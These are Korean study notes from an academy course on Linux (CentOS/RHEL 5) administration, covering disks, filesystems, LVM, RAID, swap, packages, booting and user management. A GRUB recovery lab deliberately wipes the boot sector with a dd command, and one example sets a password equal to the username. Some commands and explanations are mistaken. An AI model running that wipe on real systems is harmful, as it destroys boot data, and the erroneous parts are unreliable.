학원 스텝 1 : 디렉토리 구조
	디렉토리의 매뉴얼 확인 : # man 7 hier 
	# ls -l
		backup  data1  data4  home        media  net   root     srv   tmp
		bin     data2  dev    lib         misc   opt   sbin     sys   usr
		boot    data3  etc    lost+found  mnt    proc  selinux  test  var
	시스템 기본정보 확인법
		Hostname 	: # hostname
		OS종류 		: # cat /etc/redhat-release
		커널버전		: # uname -a
		CPU 확인		: # cat /proc/cpuinfo
		MEM 확인		: # free, #top		
		DISK 확인		: # fdisk -l 
		NETWORK 확인	: # ifconfig -a , # netstat -nr, # cat /etc/resolv.conf
		[실무예] 하드웨어 각종 관련
		# dmidecode 

학원 스텝 2 : 장치 관리(EX : DISK 장치 관리)
	디스크 작업
		* 장치 인식
		* 파티션 작업
		* 파일시스템 작업
		* 마운트 작업
		
		디스크 장치 인식 작업
			(선수지식)
				디스크 종류
					IDE 확장->(SATA, Serial ATA)					  : 성능↓ 확장성↓ 가격↓ 
					SCSI 확장->(SAS, SA-SCSI, Serial Attached SCSI):  성능↑ 확장성↑ 가격↑
					SSD									          : 성능 read*10, write*15~20, 발열소음↓, 전력↓, 가격↑
					
				디스크 구조
					섹터 -> 트랙 -> 실린더 -> 파티션 -> 디스크
					
				디스크 이름 체계
					IDE) /dev/hda, /dev/hdb, /dev/hdc, /dev/hdd 여긴 4개가 최대
					SCSI) /dev/sda, /dev/sdb, /dev/sdc, /dev/sdd ..... 여긴 계속 늘어남
					
				디스크 파티션 이름체계/번호
					파티션 종류
						-primary partition(1~4)
						-extended partition
							-logical partition(5~15)
		
			(디스크 장치 인식 작업)
				# chkconfig kudzu on	: kudzu를 온시켜야 디스크 장치 인식 작업이 가능
				# poweroff				: 하고 새로운 디스크 등록
				전원on하고 추가된 디스크 확인법
				# fdisk -l
				[참고] 서버에 장치 목록/정보 확인
				(CLI) # lshal
				(GUI) # hal-device-manager & 

		파티션 작업
			(선수지식)
				디스크 파티션 이름체계/번호
					파티션 종류
						-primary partition(1~4)
						-extended partition
							-logical partition(5~15)
							
			(파티션 작업)
			fdisk - MBR partition (BIOS)는 1섹터에 512byte인데 이중 partition은 64바이트라 총 용량은 2TB밖에 제어를 못함
			gdisk - GPT partition (GUID)는 2TB보다 큰 디스크를 제어하기위해서는 gdisk를 사용한다 
			
			# fdisk /dev/sdb 디스크 넣은거 들어가면 설정가능
			p - 현재 디스크 설정 프린트된거 나옴
			n - 확장과 기본파티션으로 구분가능
			d - 삭제하는것
			w - 저장
			# fdisk -l /dev/sdb 이걸로 확인
			# partprobe 로 동기화 

		파일시스템 작업
			(선수지식)
				파일시스템 : 파일을 저장하고 관리하는 체계
				종류 :
					ext2 안전성에 초점  xfs와 경쟁상대임 
					ext3 xfs와 동일한 성능인데 기능은 up
					ext4 는 기능에 초점을두고 xfs는 성능에 초점을둬서 많이 올라옴 
					xfs
				파일시스템 구조 
				#  dumpe2fs/dev/sdb1 		파일시스템구조확인
			(파일시스템 작업)
			# mkfs -t etx2|ext3 /dev/sdb1 					sdb1을 2나 3으로 파일시스템 만들기
			# dumpe2fs /dev/sdb1  (# tune2fs -l /dev/sdb1)	sdb1의 파일시스템 확인법 
			# mkfs.ext3 -m 10 /dev/sdb1 					파일시스템(EX: ext3)이 풀(Full) 났을 때 관리자만 쓸수 있는 공간으로 예약된 공간(0% ~ 50%, Default : 5%)
			# tune2fs -l /dev/sda1 | grep -i Reserved		10퍼센트의 공간을 확인하는 법
			# mkfs.ext3 -L mkfs /dev/sdb1   				이름을 지정할수잇다
			[실무예] 파일시스템이 풀난 경우
			# tune2fs -m 1 /dev/sdb1 					민프리공간을 1프로로 줄여 남는 공간을 많게 만들어 시간 범
			[실무예] df -h 출력 결과 해석
			-------------------------------------------------------
			Filesystem            Size  Used Avail Use% Mounted on
			/dev/sda1              17G  3.9G   12G  26% /				SIZE는 USED+AVAIL 인데 민프리 공간때문에 차이가 있음 
			/dev/sda8             487M   11M  451M   3% /data1
			/dev/sda7             487M   11M  451M   3% /data2
			/dev/sda6             487M   11M  451M   3% /data3
			/dev/sda5             487M   11M  451M   3% /data4
			/dev/sda3             487M   11M  451M   3% /home
			-------------------------------------------------------
		
		마운트 작업
			mount CMD	: 현재 마운트 할 때 사용하는 명령어
			/etc/fstab	: 부팅시 마운트 할 때 사용하는 파일
			마운트 확인
				# df -k	: 마운트 상황 정보, 디스크 사용량 점검 확인
				# mount : 마운트 옵션 정보 확인, 마운트 시간 확인
			마운트 관련 파일들
				/etc/mtab	: 현재 마운트된 정보를 담는다
				/etc/fstab	: 부팅시에 마운트 할 만한 정보를 담는다.
			마운트 관련 명령어들
				mount CMD
					# mount [-t ext3] [-o OPTIONS] /dev/sdb1 /testmount
					[-t ext3] : ext2, ext3, ext4, xfs, nfs 등등 들어감 생략 가능
					[-o OPTIONS] : defaults(rw, nouser, auto, exec, suid)
										    ro, noauto, noatime, noexec, nosuid, user
					[EX] ro OPTIONS					읽기만 가능하게 함 
					[EX] noatime OPTIONS			접근시간을 기록하지 않음(성능: Caching 공간)
					[EX] nosuid OPTIONS				setUID처럼 동작하지 않게함 (보안: /home 공간)
					[EX] usrquota/grpquota OPTIONS	디스크의 저장장치의 사용을 제한하는것 (관리: /home 공간)
					
				umount CMD
					# umount /dev/sdb1
					# umount /testmount 
					[실무예] Busy File System umount 방법(EX : /home)
					* fsck CMD 					유마운트하고 실행해야함 이건 
					* dump CMD					offline backup임
					# fuser -cu /home(lsof CMD)	/home유저안에 사용자들 pid와 사용자이름 나옴
					# wall '나가주세요'				공지줌 
					# fuser -ck /home(kill CMD) /home유저안에 사용자들 다 죽임
					
				mount -a CMD (/etc/fstab)파일을읽음 	마운트 할 만한 정보를 모두 마운트 하는 명령어
					# mkdir -p /testmount
					# mount /dev/sdb1 /testmount 	이렇게 등록해놓고
					# vi /etc/fstab					에등록해야 켜질때 켜짐 
					# umount /testmount				되나 유마운트하고
					# mount /testmount 				다시 마운트해서 되는지 확인
					--------------------------------------------------
					# mkdir -p /testmount			디렉토리만들고
					# vi /etc/fstab					fs만듬
					# mount -a						이렇게하면 위랑 똑같음 따라서 mount -a를 사용 
					
				umount -a CMD  (/etc/mtab)파일을읽음	마운트 되어 있는 자원을 모두 해제
	
		기타 마운트 관리
			CD 마운트
				자동 마운트
					Automount
					# cd /media/CentOS_5.5_Final				여기에 마운트되어있음
					# cd ; umount /media/CentOS_5.5_Final		마운트 해제함
				수동 마운트
					# mkdir -p /mnt/cdrom ; mount -t iso9660 -o ro /dev/cdrom /mnt/cdrom 	-p는포인터
					# cd /mnt/cdrom
					# cd ; umount /mnt/cdrom
					
			ISO 이미지 마운트
				# mkisofs -o /test/a.iso /etc/sysconfig/* 			sysconfig밑에 파일 묶어서 a.iso이미지파일만듬
				# mkdir -p /mnt/iso 								/mnt/iso파일만듬 -p는포인터 
				# mount -t iso9660 -o loop /test/a.iso /mnt/iso 	
				# cd /mnt/iso
				# cd ; umount /mnt/iso
			
			USB (FAT32/NTFS) 마운트
				FAT32
					자동 마운트
						Automount
						# cd /media/disk
						# cd ; umount /media/disk
					수동 마운트
						# mkdir -p /mnt/usb						-p는포인터
						# mount -t vfat /dev/sdb1 /mnt/usb		FAT일 때 -t 옵션에 vfat를 주고 마운트
						# cd /mnt/usb
						# cd ; umount /mnt/usb
				NTFS
					[참고]
					# mount -t ntfs -o iocharset=cp949 /dev/hda1 /mnt/ntfs
				
			RAMFS 마운트 : RAM을 디스크처럼 사용
				(주의)재부팅시 안에 내용이 다 날라감 
					# top -n 1 | grep Mem: 							 MEM의 용량봄
					# free 											 남은용량봄
					# mkdir -p /mnt/ramdisk 						 /mnt/ramdisk 포인터생성
					# mount -t tmpfs none /mnt/ramdisk -o size=10m 	 -t는 타입으로 장치가없기때문에 none 사이즈 10m
					# cd /mnt/ramdisk
					# cd ; umount /mnt/ramdisk
					
			NFS 마운트
				# showmount -e 192.168.0.249					249의 공유자원을 본다
				# mkdir -p /mnt/share							디렉토리만들기
				# mount -t nfs 192.168.0.249:/share /mnt/share	nfs타입으로 마운트하기 
				# cd /mnt/share
				# cd ; umount /mnt/share
				
			
		파일시스템 점검
			fsck CMD 
				(주의)/home, /data1 		- umount CMD 하고 fsck CMD 해야함
					/, /usr, /var, /tmp - single user mode 하고 fsck CMD해야함
				# fsck /dev/sda3
				# fsck -y /dev/sda3
				[실무예] # fsck -y /dev/sda1
				# script -a fsck.log 이밑에 출력되는건 다 fsck.log파일에 저장된다는뜻   (# fsck -y /dev/sda3 2>&1 | tee –a fsck.log) 2>&1이없으면 정상출력결과만들어감 
				# fsck -y /dev/sda3 
				# exit 
				# cat fsck.log 
				[실무예] 슈퍼블록 복구 방법
				# dumpe2fs /dev/sdb1 | grep -i superblock
				# e2fsck -b ### /dev/sdb1
				[실무예] 배드블럭 발생한 경우의 처리 
				# badblocks -v /dev/sdb1
				# e2fsck -cf /dev/sdb1
					-f     (force) 화일 시스템에 이상이 없다 하더라도 점검을 하도록 강제한다.
					-c     e2fsck로 하여금 badblocks(8) 을 실행하여 화일 시스템 상의 배드 블럭을 찾아내고 배드블럭 아이노드에 추가함으로써 표시를 해둔다.
		
		파일시스템 모니터링
			df CMD 		: 파티션 단위의 사용량 점검
			du CMD		: 디렉토리 단위의 사용량 점검
			find CMD
			[실무예] 파일/디렉토리/파일시스템 용량 확인
			# df -k 									파티션 사용량 kilo단위로 나옴
			# du -sk 									/var 폴더밑에 용량합쳐서 나옴
			# cd /var ; du -sk * | sort -nr | more var  파일내용중 합친걸 정렬해서 보여줌
			# find /var -size +300M -type f 			300M이상 파일을 보여줌

물리적 -> 논리적 (안전,성능,확장,관리용이) 리눅스 운영체제 LVM권장

	학원 스텝 3 : LVM 관리
		LVM 관련 용어
			PV(PE) : 피지컬한 볼륨 기본 디스크를 말함, PE는 PV를 여러개로 나눈것중 한개의 단위
				PV
					pvremove CMD
						# pvremove /dev/sda1 
					pvcreate CMD
						# pvcreate /dev/sda1
					pvmove CMD
						# pvmove /dev/sda1 /dev/sdb1 데이터를 이동시킴 
					pvs/pvdisplay CMD
						# pvs 
						# pvdisplay
			VG	   : PV를 모아놓은것
				VG
					vgcreate CMD
						# vgcreate vg1 /dev/sdc1 /dev/sdd1 /dev/sde1
					vgremove CMD
						# vgremove /dev/vg1 
					vgextend CMD
						# vgextend vg1 /dev/sdf1 
					vgreduce CMD
						# vgreduce vg1 /dev/sdf1 
					vgrename CMD
						# vgrename /dev/vg1 /dev/vg1_backup
					vgs/vgdisplay CMD
						# vgs
						# vgdisplay
			LV(LE) : VG중 원하는크기의 디스크를 만든것 LE는 그걸 여러개로 나눈것중 한개의 단위
					 PE의 사이즈 = LE의 사이즈 매핑해서 만들기때문에 
				LV(Logical Volume)
					lvcreate CMD
						# lvcreate -L 1G -n lv1 vg1			1기가로 lv1이름으로 만들다
						# lvcreate -l 100%FREE -n lv1 vg1	-l은 스트링으로 크기를 줄수있음
						# lvcreate -i 1G -i 3 -n lv1 vg1	vg1을 lv1으로만들고 스프라이트 방식으로 총 3개의 디스크를 만듬
						# lvcreate -L 1g -m 1 -n lv1 vg1	vg1을 lv1으로만들고 미러방식으로 총 1개를 백업으로 사용함 
					lvremove CMD
						# lvremove /dev/vg1/lv1
					lvextend CMD
						# lvextend -L +1G/2G -n lv1 vg1
						# lvextend -l 100%FREE -n lv1 vg1 
					lvreduce CMD
						# lvreduce -L -1G/2G -n lv1 vg1
					lvs/lvdisplay CMD
						# lvs
						# lvsdisplay [/dev/vg1/lv1]
		LVM 작업절차
			파티션작업
				# fdisk CMD 	: 파티션 아이디 8e
			PV생성
				# pvcreate CMD  
			VG생성
				# vgcreate CMD
			LV생성
				# lvcreate CMD
			파일시스템 생성
				# mkfs CMD
			마운트작업
				# mount CMD, /etc/fstab
			지울때는 역순으로 실행	
			
	학원 스텝 4 : RAID 관리 
		레이드종류 : 레이드는 스토리지에서 사용하며 서버에서 펌웨어를 통해 작업함)
			H/W RAID : 펌웨어에서 관리하며 성능우수 유연성떨어짐
			S/W RAID : 운영체제에서 소프트웨어 레이드 툴을 통해 작업 성능 떨어짐 유연성 우수
	
		스토리지의 종류
			DAS(Direct Attached Storage) : 직접 연결 저장 장치
										   Internal DAS (ex:내장디스크)
										   Extenal DAS (ex:외장디스크)
	
			NAS(Network Attacked Storage) : 네트워크 소속 스토리지 가격이비싼SAN을대신해 사용 (스토리지의 파일을 서버에서 디렉토리로바라봄) (ex:가정용NAS)
			Server ------- SAN(SAN Switch) ------- Storage
			(HBA필요)		   스위치필요				  FC port필요 		HBA1개당 포트2개가 최대
						   구간전송속도 10Gbps
						   IP프로토콜 이용 
		
			SAN(Storage Area Network): 스토리지 전용 네트워크 (스토리지의 디스크를 서버에서 디스크로 바라봄)
			Server ------- SAN(SAN Switch) ------- Storage
			(HBA필요)		   스위치필요				  FC port필요 		HBA1개당 포트2개가 최대
						   구간전송속도 16Gbps
						   FC프로토콜 이용 
		   
		RAID 레벨의 종류
			RAID 0 : 디스크2장이상필요
				Concatenate  디스크사용효율 (-) 성능(r/w) r(-) w(-) , 안전성 ↓
				Stripe		 디스크사용효율 (-) 성능(r/w) r(↑) w(↑) , 안전성 ↓↓
			RAID 1 : 디스크2장이상필요
				Mirroring	 디스크사용효율 (↓↓) 성능(r/w) r(↑) w(-) , 안전성 ↑↑
			RAID 5 : 디스크3장이상필요
				Stripe with parity 디스크사용효율 (↓) 성능(r/w) r(↑) w(↓↓) , 안전성 ↑
			RAID 6 : 디스크4장이상필요
				레이드5는 디스크 2개 고장시 복구 불가임 이거는 패리티를2개써서 복구가 가능 대신 r의 성능이 매우 떨어짐
			RAID 7
				레이드7은 레이드6의 r의 성능을 높이기위해서 새롭게 패리티비트를 관리해주는 real-time 운영체제를 사용하는것
				
		RAID 작업절차
			(ㄱ)파티션작업 (fidisk CMD, partition id :fd)
			(ㄴ)RAID 작업 (mdadm CMD)
			(ㄷ)파일시스템 작업 (mkfs CMD)
			(ㄹ)마운트 작업 (mount CMD, /etc/fstab)
			
		mdadm CMD
			생성
				# mdadm --create /dev/md0 --level=0 --raid-device=2 /dev/sdc1 /dev/sdd1
				# mdadm --create /dev/md1 --level=1 --raid-device=2 /dev/sdc1 /dev/sdd1
				# mdadm --create /dev/md5 --level=5 --raid-device=3 /dev/sdc1 /dev/sdd1 /dev /sde1
				# echo "DEVICE partitons" > /etc/mdadm.conf 
				# mdadm --detail --scan >> /etc/mdadm.conf
			지우기
				# mdadm --stop /dev/md0
				# mdadm --remove /dev/md0
				# mdadm --zero-superblock /dev/sdc1 /dev/sdd1 /dev/sde1
				# rm -f /etc/mdadm.conf
			[실무예] Storage(RAID) ---> Server 로 디스크를 넘겨줌 
			RAID 1+0 (성능을 올리고 싶을때)
			RAID 5	 (일반적으로 사용)
			RAID 6	 (저장할때 사용)
		
		[참고] RAID & LVM 차이점
		* 기술 비교		 LVM은 패리티가없음 
		* 작업 방법에 비교 	 LVM은 PV,VG,LV RAID는 mdadm 
					
학원 스텝 5 : SWAP관리		
	SWAP관리
		스왑과 페이지란
			-스왑은 디스크내에 존재하는 가상정인 MEM공간이며 물리적인 메모리 연장 공간처럼 쓰임
			-우선순위에밀려 Paging 단위로 이동함(4k) = paging증가 -> MEM부족 -> 성능 떨어짐 -> MEM증설고려
			MEM(RAM)                   DISK
			+--------+---------+        +--------------+
			|        |         |        |  File System |
			|   1    |   2     |        |    (ext3)    |  
			|        |         |        |  한글.exe 쓰려면 |
			|        |         |  <-----|  RAM으로이동    |
			+--------+---------+        +--------------+
			|        |         |        |              |
			|   3    |   4     |        |     SWAP     |  
			|        | 우선순위↓  |        |              |
			|        | 디스크로감  | -----> |              |
			+--------+---------+        +--------------+
		
		SWAP 관련 이슈
			- 언제 스왑을 추가하는가? 
				피지컬메모리가 사용량이80%가 넘었을 때 
			- 스왑 공간의 크기?
				(초기 설치시) 운영체제의 가이드에 따라
				(운영시)	  os+service(DB)는 DB가이드라인에 따라서 스왑공간정하기 
			- 스왑을 추가하면 성능이 좋아지는가?
				NO, MEM은 늘리면 좋지만 스왑공간은 아니다 그냥 멈추지말라고 스왑을 추가하는거임 HANG상태에 빠지지 않게 하기 위해 
		
		SWAP 관리
			SWAP File(EX: /swap/swapfile)
				(ㄱ) # dd if=/dev/zero of=/swap/swapfile bs=1M count=1024   제로포맷으로 블록사이즈 1M로 1024개 하면 총1기가가 swapfile에 저장
				(ㄴ) # mkswap /swap/swapfile		스왑 파일시스템 생성
				(ㄷ) # swapon /swap/swapfile		스왑 activate
				(ㄹ) # vi /etc/fstab
				해제
				# vi /etc/fstab
				# swapoff /swap/swapfile
				# rm -f /swap/swapfile
				
			SWAP Partition(EX: /dev/sdb1)
				(ㄱ) # fdisk /dev/sdb(P1)	스왑공간으로 쓸만큼 파티션 용량을잡음 파티션 id=82번이여야함
				(ㄴ) # mkswap /dev/sdb1
				(ㄷ) # swapon /dev/sdb1
				(ㄹ) # vi /etc/fstab
				해제
				# vi /etc/fstab
				# swapoff /dev/sdb1
				파티션은 지우는게 아니라 여기 까지만 해도 됨 
				# mkfs.ext3 /dev/sdb1 
	
학원 스텝 6 : 소프트웨어 관리
	패키지? 		소프트웨어(EX : Excel)=소프트웨어는 파일과 디렉토리의 묶음
	그룹패키지? 	패키지의 묶음(EX : MS Office)
	환경그룹패키지? 	패키지 or 그룹 패키지의 묶음 
	rpm CMD
		RPM 패키지 설치 및 업데이트
			# rpm -ivh package-filename.rpm 		 /* 패키지 설치, 이전 버전의 패키지를 삭제하지 않고 새 버전 설치 */
				(-i: install, -v: verbose, -h: hash)
			# rpm -Fvh package-filename.rpm 	 	 /* 패키지 없데이트, 이전 버전의 패키지가 있을 경우만 패키지를 설치 */
				(-F: Freshen)
			# rpm -Uvh package-filename.rpm 		 /* 패키지 업데이트, 이전 버전이면 업그레이드 하고 없으면 설치 */
				(-U: Upgrade)
			# rpm -ivh --nodeps package-filename.rpm /* 의존성 체크 안함, 의존성 문제를 무시하고 설치 */
				(-nodeps: no dependency)
			# rpm -Uvh --force package-filename.rpm  /* 패키지 충돌이 방생해도 강제적으로 설치 */
			# rpm -e package-filename 				 /* 패키지 삭제 */
				(-e: erase)
		RPM 패키지 정보 확인
			# rpm -qa | grep package-filename 		 /* 전체 패키지 목록에서 지정된 패키지 설치 유무 확인 */
			# rpm -qi package-filename			     /* -i: information, 설치된 패키지의 자세한 정보 확인 */
			# rpm -ql package-filename 			     /* -l: list, 설치된 패키지의 파일과 디렉토리 목록 확인 */
			# rpm -qf /usr/bin/ls 		 			 /* -f: file, 지정된 파일이 포함된 패키지 이름 확인 */
			# rpm -qi -p package-filename.rpm 	     /* -p: packages file, 설치하고자 하는 패키지의 자세한 정보 확인 */
			# rpm -e [--nodeps] PKG					 /* -e: 삭제명령 */
			
		패키지 파일 이름 형식
		(예) name   -version	-release.	architecture .rpm 
			kernel -2.6.9	-42.0.2.EL.	i686		 .rpm
		
	yum CMD
		yum방식
			----yum repository----		----yum client----
			최신 버전의 CD(패키지들존재)			# yum install PKG		어디서 받으라는 명시가 없음 
										/etc/yum.repos.d/*.repo 에 저앞에 서버 목록들에서 받으라고 미리 지정함
		yum활용
			rpm 명령어를 통해 패키지 설치의 어려움 => 패키지 의존성 관계	
			=> (ㄱ) 패키지의 의존성 관계를 해결하고 (ㄴ)효율적인 패키지 관리를 위해 
			=> yum CMD
		패키지 확인 
			# yum list      			  전체를 다 보여줌
				# yum list | grep PKG	  패키지이름이 설치되어있는지 알려줌
			# yum info PKG				  패키지 정보를 보여줌 설치유무도 알려줌
			# yum search KEYWORK		  키워드에 포함된 모든 내용을 보여줌 내용에포함된것도 보여줌
			# yum list installed 		  설치된거 다 보여줌
			# yum list available 		  이용 가능한거 다 보여줌
			# yum [-y] remove PKG		  설치된 pkg삭제 
		패키치 설치 & 업데이트
			# yum -y update 	 		  yum패키치 전체 업데이트
			# yum -y update php	 		  php를 업데이트 없으면 업뎃못함(비슷한거#rpm –Fvh PKG.rpm)
			# yum -y install php 		  php를 업데이트 없으면 설치하고 업뎃(비슷한거#rpm –Uvh PKG.rpm)
			# yum -y localinstall php.rpm 의존성에 대해서 다 설치하는것
			[실무예] yun - y update
			# yum check-update 2>&1 | tee yum.log	업데이트체크후 yum.log파일에 기록함
			# yum -y update
		그룹 패키지 설치 
			# yum groupinstall <group> 
			# yum groupupdate <group> 
			# yum grouplist 
			# yum groupinfo <group> 
			# yum groupremove <group> 
			
	source 
		소스형태로 S/W설치하는 이유 
			관리자 관점
			(ㄱ) 최신 버전의 오픈 소스 소프트웨어(최신 기능)를 사용하기 위해서 
				-패키지 형태로 나오지 않아서 스스로 넣어서 사용하는 것 
			(ㄴ) 오픈 소스 소프트웨어의 크기를 줄이기 위해서
				-필요없는 기능을 지우고 사용하려고 
			(ㄷ) 고객이 낮은 버전의 S/W를 요청 -> 낮은 버전의 Library -> (X)
			(ㄹ) 보안장비의 보안 S/W가 Open Source를 설치하는 경우에는 소스형태로 컴파일 한다.
		Apache 소스 프로그램 설치 과정
			(ㄱ) 소스 파일 다운로드
			(ㄴ) 압축 해제
				# tar xvzf pkg.tar.gz 
			(ㄷ) configure && make && make install
				1./.configure는 초기화되어있지않은 많은변수들이 makefile에 있는데 이걸함으로써 makefile에 초기화를 시킨다
					1.시스템점검
					2.makefile생성
				2.make는 makefile을 다중컴파일해서 컴파일과 여러들의 파일을 만듬
					1.컴파일생성
				3.make install
					1.2번에서 생성된 컴파일파일을 적당한 위치로 옮김
					2.1에서 prefix로 정의한 곳에 아파치폴더만들고 그 밑에 2번에서만든 디렉토리들을 넣고 파일들을 넣는다 
			(ㄹ) 웹서비스 시작 및 확인
				(주의) "apachectl start" 하기전에 기존 프로그램의 apache daemon 떠 있으면 안된다.
	
	Create an RPM(소스코드로 설치한 프로그램을 .rpm으로 만든것 이렇게 만든 .rpm은 yum repository에 올려서 구성하는것)
		rpm 패키지 생성 절차
			(ㄱ) 소스 프로그램 개발 
				# mkdir -p hello-1.0 		
				# vi hello-1.0/hello.sh 
			(ㄴ) 소스.tar.gz 파일 생성
				# tar cvzf /usr/src/redhat/SOURCES/hello-1.0-1.tar.gz hello-1.0 
			(ㄷ) SPEC 파일 생성(가장중요 의존성에 걸리기때문에 rpm으로 만들려면 서로 의존성관계를 정확히 파악해야함)
				# vi /usr/src/redhat/SPECS/hello.spec
			(ㄹ) rpm build
				# yum -y install rpm-build 
				# rpmbuild -ba /usr/src/redhat/SPECS/hello.spec 
				디스크에서 설치해서 여기서 hello.sh해도 됨
			(ㅁ) GPG Key 생성
				# gpg --gen-key (-> Key ID 확인: ACD89B3E)
				# gpg -a -o ~/RPM-GPG-KEY-test --export ACD89B3E  키값이 담긴 파일을 생성한다 
				# vi ~/.rpmmacros 	여기안에 %_gpg_name ACD89B3E 를 넣어줘서 항상 무결성유지 
			(ㅂ) 패키지 sign
				# rpm --resign /usr/src/redhat/RPMS/i386/hello-1.0-1.i386.rpm 
			(ㅅ) Yum Repository 구성
				# mkdir /var/www/html/packages 
				# cp /usr/src/redhat/RPMS/i386/hello*.rpm /var/www/html/packages 
				# cp ~/RPM-GPG-KEY-test /var/www/html/packages 
				# yum -y install createrepo 
				# createrepo /var/www/html/packages
				# service httpd restart  
			(ㅇ) 테스트
				# vi /etc/yum.repos.d/hello.repo 
					안에내용
						[hello]
						name=hello
						description=Test Yum Repository
						baseurl=http://172.16.6.2XX/packages
						enabled=1
						gpgcheck=1
						gpgkey=http://172.16.6.2XX/packages/RPM-GPG-KEY-test
				# yum -y install hello 
				# hello.sh 

학원 스텝 7 : 부팅과정과 장애처리
	리눅스 운영체제 부팅과정
		(ㄱ) F/W 단계(EX : BIOS)
			* POST(Power On Self Test)
			* Boot Device 인식/순서 결정
			
		(ㄴ) BootLoader 단계(EX : GRUB)
			* LiLO(Linux Loader) - /etc/lilo.conf
			* GRUB(Grand Unified Bootloader) - /etc/grub.conf
				- /boot/grup/brup.conf	이안의 파일에
					- /boot/vmlinuz* 	이거 압축되어있는거 풀고
					- /boot/initrd*		이것도 압축되어있는거 풀음 
				# grub-install /dev/sda 	그루브에 문제가있을경우 이걸로 재설치
				
		(ㄷ) Kernel 단계(EX : /boot/vmlinuz*)
			* swapper (PID 0)		실행함
			* /sbin/init (PID 1)	실행함
		
		(ㄹ) Init 단계(EX : /sbin/init, /etc/inittab)
			* /sbin/init
			* /etc/inittab	시스템 초기화 방식 나옴 
	
		/etc/inittab 파일의 해석 
			ID			부팅할 RunLevel 결정함
			sysinit		기본적인 시스템 초기화 
			Runlevel	ID의 런레벨을 동작시킴 보통 3이나 5를 사용 
			initdefault 런레벨에 맞는 시작 스크립트(Startup Script) 실행
						/etc/rc.d/rc 5 -> s로시작과 k시작이 있는데 s시작은 스타트이고 k는 스탑임 
			ctrlaltdel	누르면 재부팅됨 
			powerfail	UPS라는걸로 전력이 제대로 들어오지않으면 종료한다라는 문구를 알려줌
			powerokwait UPS에 전력이 제대로 들어왔다라는걸 알려줌 
			respawn		텍스트 로그인창,실행하고 꺼져도 다시 켜지게해줌 
		
				부팅시 실행할 스크립트							현재 실행할 스크립트
			/etc/rc5.d/S##script --------------> /etc/init.d/script start
									심볼릭링크					↑
															|
															|심볼릭링크
															|
															↓										
												/etc/rc.d/init.d/script start

		[참고]service on|off툴 종류
			(GUI) # System-config-services (#serviceconf)
			(TUI) # ntsysv (#setup)
			(CLI) # chkconfig <service> on|off
			마무리는 항상 # service httpd start 해서 다시 올려주기 
			/etc/rc#.d  디렉토리 안의 스크립트이름을 S##에서 K##으로 변경되었다고 해서 현재 적용되는 것은 아니고 부팅시에 적용이 되는 것이다. 현재 서비스를 start/stop 하기 위해서는 /etc/init.d/script를 사용한다.
		[실무예] httpd 서비스 start
			1.서비스 이름 찾기
				# chkconfig --list | grep httpd 		없으면 설치해야함
			2.부팅시 서비스 시작하기
				# chkconfig httpd on 하면 k에서 s로 앞자리가 바뀜
			3.현재 서비스 시작하기
				# service httpd start
		[실무예] runlevel 조정 방법
			# init 3
			# vi /etc/inittab
			id : 3 : initdefault 
		[실무예] 런레벨 조정 하는 방법(runlevel 5->3->5)
			(현재) # init5
			(부팅) # vi /etc/inittab
		[실무예] GRUB 암호 설정하는 방법
			# grub-md5-crypt		비번치고 옆에 나온거 복사해서
			# vi /etc/grub.conf		에서 편집하고
			password --md5 <복사한것>	이거 추가하면됨 한줄로
		[실무예] 새로운 서비스 추가(!!부팅시에 서비스를 기동하고 싶다!!)
			# vi /etc/init.d/new (주의 : start|stop/restart를 인자로 받아야함)
			# chkconfig --add new 하면 등록됨 
		[실무예] GRUB 복구 실습 
			# dd if=/dev/zero of=/dev/sda bs=446 count=1  GRUB날림
			# reboot 
			이후 망가진거확인
			CD 부팅(:linux rescue)로 들어감
			# chroot /mnt/sysimage 						  지금 sysimage로 마운트된걸 /로 마운트시킴
			# cat /boot/grub/grub.conf				      파일 이상있는지 확인
			# grub-install /dev/sda 					  복구 완료
			# exit
		[실무예] /etc/fstab 파일에 이상이 있는 경우 
			su-login prompt 로그인실패시 비밀번호를 치고 들어감 	  커널에서 오류난것
			# mount -o remount,rw /
			# vi /etc/fstab 
			# exit 
		
학원 스텝 8 : 사용자 & 그룹 관리
	사용자 관리
		사용자 정보 파일들
			/etc/passwd	● 사용자의 기본적인 정보가 저장된 파일
			/etc/shadow	● 사용자의 암호가 저장된 파일
		사용자 관리 명령어
			useradd CMD
				useradd -d /users/user01 user01 
					-u UID						UID선택
					-g GID						GID선택
					-c COMMENT					설명을 달아줄때
					-d HOME_DIR					홈디렉토리 경로 바꿀때
					-s /bin/bash				쉘 바꿀때 
			usermod CMD
				# usermod -u 2000 user01																UID를 2000으로 만들기
				# usermod -s /bin/ksh user01															쉘을 ksh쉘로 만들기
				# usermod -g 10 -c "Test Group" user01 													GID를 10으로 설명은 테스트 그룹으로 만듬
				# usermod -l user03 -d /home/user03 -m user01  (-l : login name, -m : move directory)	유저1을 유저3으로 이름을바꾸고 홈디렉토리도 유저3밑으로 바꿔줌 
			userdel CMD
				# userdel [-r] user01			삭제할때 -r은 하위까지 삭제 
				
			[참고] /etc/skel	
				원래 여기에 있다가 유저만들면 여기깨 유저로 복사해서 소유자와 그룹이 바뀜
			[참고] 다중사용자 추가 스크립트
				# useradd user01
				# echo user01 | passwd --stdin user01
			[참고] useradd -D(/etc/default/useradd) 유저추가할때 기본값을 볼수있음
				# useradd -D -b /users			   홈디렉토리가아닌 유저디렉토리에만듬 
				
	그룹 관리
		그룹 정보 파일
			/etc/group
		그룹 관리 명령어
			groupadd CMD
				[참고] Primary Group/Secondary Group
				# useradd -G class1,class2 user01
				# useradd -aG class1.class2 user01
			groupmod CMD
				# groupmod -g 1000 class1
			groupdel CMD
				# groupdel class1
	패스워드 관리
		chage CMD
			# chage -l user01				user01의 상태를 확인
			# chage -M 30 -W 7 user01		맥심30이고 7일전부터 경고를보내라 
			# chage -E 2019-12-31 user01	만료기간이 12월 31일
			[실무예] MAX Age=30, WARN Age=7
			(전역) /etc/login.defs(PASS_MAX_DAYS, PASS_WARN_AGE)
			(개인) chage CMD(/etc/shadow)
			[실무예] oracle/wasuser 사용자 추가 
			여기가 오라클(DB Software)
				# groupadd oinstall 
				# groupadd dba 
				# useradd -g oinstall -G dba -d /oracle oracle 
					[참고] useradd 명령어 수행시 에러 발생되는 경우
					# useradd -g oinstall -G dba -d /oracle oracle 
					useradd: warning: the home directory already exists.
					Not copying any file from skel directory into it.
				# ls -ld /oracle 
				# chown -R oracle:oinstall /oracle 
				# passwd oracle 
				# su - oracle 
				$ id 
				$ pwd 
				$ exit 
			여기가 wasuser(Web Application Server)
				# groupadd wasgroup 
				# useradd -g wasgroup -d /was wasuser 
				# passwd wasuser 
				# su - wasuser 
				$ id 
				$ pwd 
